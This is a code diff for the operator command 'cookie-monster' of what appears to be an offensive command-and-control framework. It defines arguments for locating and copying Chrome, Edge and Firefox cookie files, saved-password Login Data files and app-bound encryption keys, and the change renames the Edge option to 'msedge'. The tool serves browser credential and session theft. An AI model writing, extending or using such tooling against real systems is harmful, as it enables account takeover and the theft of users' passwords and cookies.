@@ -1,6 +1,6 @@
 
-var cmd_cookie_monster = ax.create_command("cookie-monster", "Locate and copy the cookie file used for Edge/Chrome/Firefox", "cookie-monster [ -b [chrome || edge || firefox] [--cookie-only || --key-only || --password-only] [pid] ] or [--profile <Local State File Path> <PID>]");
-cmd_cookie_monster.addArgFlagString( "-b", "browser",        "Extract data from 'chrome', 'edge', 'firefox' or 'all'", "");
+var cmd_cookie_monster = ax.create_command("cookie-monster", "Locate and copy the cookie file used for Edge/Chrome/Firefox", "cookie-monster [ -b [chrome || msedge || firefox] [--cookie-only || --key-only || --password-only] [pid] ] or [--profile <Local State File Path> <PID>]");
+cmd_cookie_monster.addArgFlagString( "-b", "browser",        "Extract data from 'chrome', 'msedge', 'firefox' or 'all'", "");
 cmd_cookie_monster.addArgFlagString( "--profile", "profile", "Extract from custom browser profile path as system", "");
 cmd_cookie_monster.addArgBool(       "--cookie-only",        "Only retrieve the Cookie file. Do not attempt to download Login Data file or retrieve app bound encryption key.");
 cmd_cookie_monster.addArgBool(       "--password-only",      "Only retrieve the Login Data file. Do not attempt to download Cookie file or retrieve app bound encryption key.");
@@ -39,7 +39,7 @@ cmd_cookie_monster.setPreHook(function (id, cmdline, parsed_json, ...parsed_line
         if( pid == 0 ) { throw new Error("For profile need browser PID"); }
         browserPid = pid;
     } else {
-        if( browser != "chrome" && browser != "edge" && browser != "firefox" && browser != "all") { throw new Error("Extract data from 'chrome', 'edge', 'firefox' or 'all' only !"); }
+        if( browser != "chrome" && browser != "msedge" && browser != "firefox" && browser != "all") { throw new Error("Extract data from 'chrome', 'msedge', 'firefox' or 'all' only !"); }
     }
     if( browser == "all" ) browser = "";
 
